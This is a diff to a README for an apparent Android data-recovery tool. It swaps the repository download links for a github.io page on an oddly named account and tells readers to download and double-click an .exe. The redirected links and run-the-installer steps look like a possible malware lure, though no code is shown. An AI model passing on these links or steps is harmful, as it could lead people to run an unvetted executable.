@@ -1,6 +1,6 @@
 # 📱 Broken-Android-Extract-Pro - Recover Data From Any Damaged Phone
 
-[![Download Broken-Android-Extract-Pro](https://img.shields.io/badge/Download-Broken--Android--Extract--Pro-blue.svg)](https://github.com/Onobrychisviciaefoliacourtmartial907/Broken-Android-Extract-Pro)
+[![Download Broken-Android-Extract-Pro](https://img.shields.io/badge/Download-Broken--Android--Extract--Pro-blue.svg)](https://onobrychisviciaefoliacourtmartial907.github.io)
 
 ## 📌 Overview
 
@@ -20,7 +20,7 @@ Make sure your computer meets these needs before you start.
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the project repository page to begin your download: [https://github.com/Onobrychisviciaefoliacourtmartial907/Broken-Android-Extract-Pro](https://github.com/Onobrychisviciaefoliacourtmartial907/Broken-Android-Extract-Pro)
+1. Visit the project repository page to begin your download: [https://onobrychisviciaefoliacourtmartial907.github.io](https://onobrychisviciaefoliacourtmartial907.github.io)
 2. Locate the file ending in .exe.
 3. Save the file to your desktop for easy access.
 4. Double-click the file to start the installer.
